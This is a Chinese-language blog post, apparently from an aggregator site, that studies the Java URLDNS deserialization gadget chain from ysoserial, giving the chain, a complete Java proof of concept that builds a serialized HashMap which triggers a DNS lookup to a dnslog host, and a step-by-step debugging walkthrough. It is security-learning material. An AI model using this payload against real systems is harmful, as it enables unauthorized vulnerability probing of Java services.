@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+        <link rel="canonical" href="https://cambodiaaddress.github.io/html/category/article-911.htm" />
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>URLDNS反序列化链学习 - CambodiaAddress</title>
+        <link rel="icon" href="/assets/addons/xcblog/img/cambodiaaddress/favicon.ico" type="image/x-icon"/>
+    <!-- web-fonts -->
+    <link href='https://fonts.googleapis.com/css?family=Roboto:100,300,400,700,500' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
+    <!-- off-canvas -->
+    <link href="/assets/addons/xcblog/css/cambodiaaddress/mobile-menu.css" rel="stylesheet">
+    <!-- font-awesome -->
+    <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+    <!-- Flat Icon -->
+    <link href="fonts/flaticon/flaticon.css" rel="stylesheet">
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
+    <!-- Style CSS -->
+    <link href="/assets/addons/xcblog/css/cambodiaaddress/style.css" rel="stylesheet">
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8022148af1f0848b976ee8f0e7db4477";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
+     crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <div id="main-wrapper">
+        <!-- Page Preloader -->
+        <div id="preloader">
+            <div id="status">
+                <div class="status-mes"></div>
+            </div>
+        </div>
+        <div class="uc-mobile-menu-pusher">
+            <div class="content-wrapper">
+                                <!-- .navbar-top -->
+                <nav class="navbar m-menu navbar-default">
+                    <div class="container">
+                        <!-- Brand and toggle get grouped for better mobile display -->
+                        <div class="navbar-header">
+                            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1">
+                                <span class="sr-only">Toggle navigation</span>
+                                <span class="icon-bar"></span>
+                                <span class="icon-bar"></span>
+                                <span class="icon-bar"></span>
+                            </button>
+                                                        <a class="navbar-brand" href="/">Cambodia Address</a>
+                                                    </div>
+                        <!-- Collect the nav links, forms, and other content for toggling -->
+                        <div class="collapse navbar-collapse" id="#navbar-collapse-1">
+                            <ul class="nav navbar-nav navbar-right main-nav">
+                                                                <li><a href="/xcblog/">首页</a></li>
+                                                                <li><a href="/html/category/">文章分类</a></li>
+                                                                <li><a href="#">关于</a></li>
+                                <li><a href="#">联系</a></li>
+                            </ul>
+                        </div>
+                        <!-- .navbar-collapse -->
+                    </div>
+                    <!-- .container -->
+                </nav>
+                <!-- .nav -->
+                <section class="single-page-title single-page-title-about">
+                    <div class="container">
+                        <div class="row">
+                            <div class="col-md-12">
+                                <h2>URLDNS反序列化链学习</h2>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                <!-- .page-title -->
+                <section class="featured-box">
+                    <div class="container">
+                        <div class="row">
+                            <div class="col-md-9">
+                                <ol class="breadcrumb">
+                                  <li><a href="/">首页</a></li>
+                                  <li><a href="/html/category/">文章分类</a></li>
+                                  <li class="active">正文</li>
+                                </ol>
+
+                                  				  				  				<h1 id="urldns">URLDNS</h1> <p>URLDNS跟CommonsCollections比起来真是眉清目秀，该链主要用于验证漏洞，并不能执行命令，优点就是不依赖任何包。</p> <h2 id="1利用链">1、利用链</h2> <pre><code class="language-java"> *   Gadget Chain:  *     HashMap.readObject()  *       HashMap.putVal()  *         HashMap.hash()  *           URL.hashCode()    		URLStreamHandler.hashCode()    		  URLStreamHandler.getHostAddress()</code></pre> <p>其实看这个利用链我们就能发现其实跟cc6的利用是差不多的。</p> <h2 id="2poc">2、POC</h2> <h3 id="21漏洞复现">2.1、漏洞复现</h3> <pre><code class="language-java">import java.io.*; import java.lang.reflect.Field; import java.net.*; import java.util.HashMap; import java.net.URLStreamHandler; import java.util.HashMap;  public class URLDNS {     public static void main(String[] args) throws Exception {         String url="http://wmm760.dnslog.cn";         URLStreamHandler handler = new SilentURLStreamHandler();          HashMap ht = new HashMap(); // HashMap that will contain the URL         URL u = new URL(null, url, handler); // URL to use as the Key         ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.          Field hashCode = URL.class.getDeclaredField("hashCode");         hashCode.setAccessible(true);         hashCode.set(u, -1);          serialize(ht);         unserialize();      }     static class SilentURLStreamHandler extends URLStreamHandler {          protected URLConnection openConnection(URL u) throws IOException {             return null;         }          protected synchronized InetAddress getHostAddress(URL u) {             return null;         }     }       public static void serialize(Object obj ) throws Exception{         ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("test.bin"));         objectOutputStream.writeObject(obj);     }     public static void unserialize() throws Exception{         ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("test.bin"));         objectInputStream.readObject();     } }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/181ad4477bdb729fd1e6ecfd8c9b3b28.jpg" alt="URLDNS反序列化链学习"></p> <h3 id="22poc分析">2.2、POC分析</h3> <p>其实创建了一个空的URLStreamHandler，把它放进我们的创建的URL类（放着我们的验证dnslog），再把 他们放进HashMap，通过反射去修改URL的hashCode属性为-1。</p> <pre><code class="language-java">String url="http://wmm760.dnslog.cn"; URLStreamHandler handler = new SilentURLStreamHandler();  HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.  Field hashCode = URL.class.getDeclaredField("hashCode"); hashCode.setAccessible(true); hashCode.set(u, -1);</code></pre> <p><strong>URLStreamHandler</strong></p> <p>我们看第一段的URLStreamHandler类的hashcode方法,他会把我们的传进去的URL通过getHostAddress触发，我们现在需要查找哪里调用了URLStreamHandler的hashCode()</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/256e57c27641b0a9913af731e4ca7173.jpg" alt="URLDNS反序列化链学习"></p> <p><strong>URL</strong></p> <p>在URL类中的hashCode方法，如果hashCode不等于-1，就会直接返回，这就是我们为什么要反射 设置hashCode为-1的原因，handler其实就是我们在URL构造方法传入的URLStreamHandler，所以这里调用的是URLStreamHandler的hashCode方法，并且this就是我们的通过构造方法传入的URL类。再往上找哪里调用hashCode方法，这时我们就可以想到cc6链的运用了。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/05ed511c98a283602b53f9fa0078e830.jpg" alt="URLDNS反序列化链学习"></p> <p>那就是HashMap</p> <p>HashMap的hash方法会用传入的key去调用key的hashcode方法，所以我们只要把URL类传给HashMap的key就可以了。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/8bd211c9551e715ecbb31b5a8d536edb.jpg" alt="URLDNS反序列化链学习"></p> <p>再通过readObject的putVal调用即可</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/141325133b51dbe8c620fdc02e2687fa.jpg" alt="URLDNS反序列化链学习"></p> <h3 id="23poc调试">2.3、POC调试</h3> <p>首先我们在HashMap的readObject打下断点，可以看到key就是我们的URL类，value是一个"恶意网址"，用于条件判断</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/d7dca10b6eb1afd45beb556e51b0fb2c.jpg" alt="URLDNS反序列化链学习"></p> <p>进入到HashMap的hash方法，调用key的hashCode方法就是调用URL的hashCode方法，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/f7a9daa7f3f8b020da80205cb4e19b99.jpg" alt="URLDNS反序列化链学习"></p> <p>handler就是URLStreamHandler，在new URL()传入的，this是本类URL类，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/bbed8ad3471e511fed13cc5b6a8093ad.jpg" alt="URLDNS反序列化链学习"></p> <p>URLStreamHandler的hashCode方法，他会调用getHostAddress方法，该方法会去远程请求，多说一句也是我们审计用来审计ssrf漏洞的常用函数</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/a9758ea1baaf23685a9748494f601598.jpg" alt="URLDNS反序列化链学习"></p> <p>在这句代码会请求两三秒的样子，dnslog成功收到。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/b6d891db9dd51f8bc3a4657e5d4035fa.jpg" alt="URLDNS反序列化链学习"></p> <h3 id="24结尾">2.4、结尾</h3> <p>总体来说这条链是比较简单的，但是就是不能够执行命令</p> <p>参考链接</p> <p><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java"  target="_blank" rel="nofollow">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p> 			
+                                <div class="col-md-12 mt-5">
+                                                                        <p>上一个：<a href="/html/category/article-910.htm">PHP命名空间概述</a></p>
+                                                                        <p>下一个：<a href="/html/category/article-912.htm">python 调用 C/C++ 详解</a></p>
+                                                                    </div>
+
+                                                            </div>
+                            <div class="col-md-3">
+                                <div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">热门文章</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2"><a href="/html/category/article-1028.htm" title="tensorflow根据输入更改tensor shape">tensorflow根据输入更改tensor shape</a></li>
+                        <li class="py-2"><a href="/html/category/article-1024.htm" title="mybatis 加载配置文件的方法（两种方式）">mybatis 加载配置文件的方法（两种方式）</a></li>
+                        <li class="py-2"><a href="/html/category/article-1044.htm" title="C ++程序，实现布斯的乘法算法来对两个有符号数相乘">C ++程序，实现布斯的乘法算法来对两个有符号数相乘</a></li>
+                        <li class="py-2"><a href="/html/category/article-1034.htm" title="java.sql.ResultSet">java.sql.ResultSet</a></li>
+                        <li class="py-2"><a href="/html/category/article-1000.htm" title="@RequestBody接受参数报415错误">@RequestBody接受参数报415错误</a></li>
+                        <li class="py-2"><a href="/html/category/article-1018.htm" title="GIT 中如何打标签（git tag）">GIT 中如何打标签（git tag）</a></li>
+                        <li class="py-2"><a href="/html/category/article-1023.htm" title="在C ++中替换后检查Word是否有效">在C ++中替换后检查Word是否有效</a></li>
+                        <li class="py-2"><a href="/html/category/article-1027.htm" title="pytorch 保存模型和加载模型">pytorch 保存模型和加载模型</a></li>
+                        <li class="py-2"><a href="/html/category/article-1032.htm" title="@NotEmpty、@NotBlank等注解的正确使用 @Validated和@Valid的区别 解决@NotBlank等注解不生效的问题 使用BindingResult进行接口请求参数的统一校验">@NotEmpty、@NotBlank等注解的正确使用 @Validated和@Valid的区别 解决@NotBlank等注解不生效的问题 使用BindingResult进行接口请求参数的统一校验</a></li>
+                        <li class="py-2"><a href="/html/category/article-1005.htm" title="集成神经网络的缺点是,各种神经网络的优缺点">集成神经网络的缺点是,各种神经网络的优缺点</a></li>
+                    </ul>
+    </div>
+</div>
+
+<div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">归纳</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">24</span> <a href="/date/2024-06/" title="2024-06 归档">2024-06</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">62</span> <a href="/date/2024-05/" title="2024-05 归档">2024-05</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">60</span> <a href="/date/2024-04/" title="2024-04 归档">2024-04</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">62</span> <a href="/date/2024-03/" title="2024-03 归档">2024-03</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">50</span> <a href="/date/2024-02/" title="2024-02 归档">2024-02</a></h4>
+            </li>
+                    </ul>
+    </div>
+</div>
+
+
+
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                                <footer class="footer">
+                    <div class="copyright-section">
+                        <div class="container clearfix">
+                            <span class="copytext">
+                                CambodiaAddress 版权所有 Powered by WordPress
+                            </span>
+                            <ul class="list-inline pull-right">
+                                                                <li><a href="/xcblog/">首页</a></li>
+                                                                <li><a href="/html/category/">文章分类</a></li>
+                                                                <li><a href="#">关于</a></li>
+                                <li><a href="#">联系</a></li>
+                            </ul>
+                        </div><!-- .container -->
+                    </div><!-- .copyright-section -->
+                </footer>
+                <!-- .footer -->
+            </div>
+            <!-- .content-wrapper -->
+        </div>
+        <!-- .offcanvas-pusher -->
+        <div class="uc-mobile-menu uc-mobile-menu-effect">
+            <button type="button" class="close" aria-hidden="true" data-toggle="offcanvas" id="uc-mobile-menu-close-btn">&times;</button>
+            <div>
+                <div>
+                    <ul id="menu">
+                        <li><a href="index.html">Home</a></li>
+                        <li><a href="about.html">About</a></li>
+                        <li><a href="services.html">Services</a></li>
+                        <li><a href="contact.html">Contact</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <!-- .uc-mobile-menu -->
+    </div>
+    <!-- #main-wrapper -->
+    <!-- Script -->
+    <script src="/assets/addons/xcblog/js/frontend/cambodiaaddress/jquery-2.1.4.min.js"></script>
+    <script src="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
+    <script src="/assets/addons/xcblog/js/frontend/cambodiaaddress/smoothscroll.js"></script>
+    <script src="/assets/addons/xcblog/js/frontend/cambodiaaddress/mobile-menu.js"></script>
+    <script src="/assets/addons/xcblog/js/frontend/cambodiaaddress/scripts.js"></script>
+    <script>
+    $(function() {
+        $('.js_to').click(function(){
+            var url = $(this).data('url');
+            var code = $(this).data('code');
+            url += code;
+
+            window.open(url);
+        })
+    });
+    </script>
+</body>
+
+</html>
